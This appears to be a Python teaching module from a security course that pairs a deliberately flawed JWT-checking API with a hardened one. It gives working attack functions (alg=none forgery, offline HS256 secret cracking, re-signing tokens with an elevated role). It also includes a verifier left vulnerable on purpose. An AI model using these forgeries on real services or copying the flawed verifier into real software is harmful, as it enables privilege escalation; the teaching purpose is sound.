"""Forging JWTs for privilege escalation, and a verifier that stops it.

A tiny HS256 JWT helper is included (stdlib hmac/hashlib/base64; no PyJWT).
JWT basics (structure, claims, storage) are in chapter 10:
../../../10-api-authentication/README.md

The vulnerable API makes four mistakes at once:
  1. trusts the "alg" header, so alg=none (unsigned) tokens are accepted;
  2. signs with a weak, guessable secret (crackable offline from one token);
  3. trusts the "role" claim inside the token for authorization;
  4. never checks exp / iss / aud.
All secrets are built at runtime and labelled FAKE.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets
import time

# ------------------------------------------------------------------ HS256 helper


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def sign_hs256(claims: dict, key: bytes, header: dict | None = None) -> str:
    header = header or {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"


def decode_unverified(token: str) -> tuple[dict, dict]:
    """What any attacker (or jwt.io) can do: base64 is not encryption."""
    h, p, _ = token.split(".")
    return json.loads(b64url_decode(h)), json.loads(b64url_decode(p))


# ------------------------------------------------------------------ lab data

# Tiny wordlist of lab passwords. The vulnerable server picks its "secret" from it.
WORDLIST = ["password", "123456", "letmein", "qwerty", "admin", "changeme", "dragon", "monkey"]
USERS = {"u-alice": {"role": "user"}, "u-carol": {"role": "admin"}}
ISS, AUD = "https://auth.lab.example", "payouts-api"


class VulnerableAPI:
    def __init__(self):
        self.key = WORDLIST[5].encode()  # FAKE weak lab secret, guessable on purpose

    def issue(self, sub: str) -> str:
        return sign_hs256({"sub": sub, "role": USERS[sub]["role"]}, self.key)

    def verify(self, token: str) -> dict | None:
        header, claims = decode_unverified(token)
        if header.get("alg", "").lower() == "none":  # mistake 1
            return claims
        h, p, s = token.split(".")
        good = hmac.new(self.key, f"{h}.{p}".encode(), hashlib.sha256).digest()
        return claims if hmac.compare_digest(good, b64url_decode(s)) else None  # no exp/aud: mistake 4

    def get_payouts(self, token: str):
        claims = self.verify(token)
        if claims is None:
            return 401, "invalid token"
        if claims.get("role") != "admin":  # mistake 3: role from the token
            return 403, "admin only"
        return 200, "PAYOUT REPORT (FAKE): all driver bank payouts"


class SecureAPI:
    def __init__(self, now=time.time):
        self.key = secrets.token_bytes(32)  # 256-bit random key; in real life from a vault
        self.now = now

    def issue(self, sub: str, ttl: int = 300) -> str:
        t = int(self.now())
        return sign_hs256({"sub": sub, "iss": ISS, "aud": AUD, "iat": t, "exp": t + ttl}, self.key,
                          {"alg": "HS256", "typ": "at+jwt"})

    def verify(self, token: str) -> dict | None:
        try:
            header, claims = decode_unverified(token)
            h, p, s = token.split(".")
        except Exception:
            return None
        if header.get("alg") != "HS256":  # pin the algorithm; never read it from the token
            return None
        good = hmac.new(self.key, f"{h}.{p}".encode(), hashlib.sha256).digest()
        if not hmac.compare_digest(good, b64url_decode(s)):
            return None
        if claims.get("iss") != ISS or claims.get("aud") != AUD:
            return None
        if not isinstance(claims.get("exp"), int) or claims["exp"] <= self.now():
            return None
        return claims

    def get_payouts(self, token: str):
        claims = self.verify(token)
        if claims is None:
            return 401, "invalid token"
        role = USERS.get(claims["sub"], {}).get("role")  # role from the server's own data
        if role != "admin":
            return 403, "admin only"
        return 200, "PAYOUT REPORT (FAKE): all driver bank payouts"


# ------------------------------------------------------------------ attacks


def forge_alg_none(token: str, **changes) -> str:
    _, claims = decode_unverified(token)
    claims.update(changes)
    h = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    return f"{h}.{b64url(json.dumps(claims).encode())}."


def crack_hs256(token: str, wordlist) -> bytes | None:
    """Offline dictionary attack on one captured token (what hashcat -m 16500 does)."""
    h, p, s = token.split(".")
    target = b64url_decode(s)
    for word in wordlist:
        if hmac.compare_digest(hmac.new(word.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest(), target):
            return word.encode()
    return None


def forge_with_key(token: str, key: bytes, **changes) -> str:
    header, claims = decode_unverified(token)
    claims.update(changes)
    return sign_hs256(claims, key, header)
